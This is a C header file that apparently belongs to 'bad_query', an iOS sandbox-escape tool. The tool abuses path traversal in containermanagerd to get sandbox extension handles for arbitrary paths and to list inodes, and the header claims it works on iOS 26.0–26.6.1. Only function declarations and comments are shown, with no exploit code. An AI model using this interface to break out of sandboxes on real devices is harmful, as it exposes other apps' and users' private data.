// bad_query.h — sandbox escape via containermanagerd path traversal
// Original: https://github.com/forcequitOS/bad_query
// Works iOS 26.0–26.6.1

#pragma once
#include <stdbool.h>
#include <stdint.h>

// Obtain a sandbox extension handle for `path` via containermanagerd traversal.
// path         — absolute path you want access to (e.g. "/var/mobile/Containers/...")
// create       — pass false (create=true triggers container creation, not needed for read)
// group_identifier — NULL → uses MCMSharedSystemDataContainer (class 13, system paths)
//                    non-NULL → uses MCMSharedDataContainer (class 7, App Groups)
// is_group     — true if targeting an App Group container
// returns      — sandbox_extension handle (pass to bad_query_release when done)
//                returns -1 on failure
int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group);

// Enumerate inodes at `path` up to max_inode. Returns a newline-separated list
// of fsgetpath results. Caller must free the returned string.
char *bad_query_list(char *path, int64_t max_inode);

// Release a sandbox extension handle obtained from bad_query().
void bad_query_release(int64_t handle);
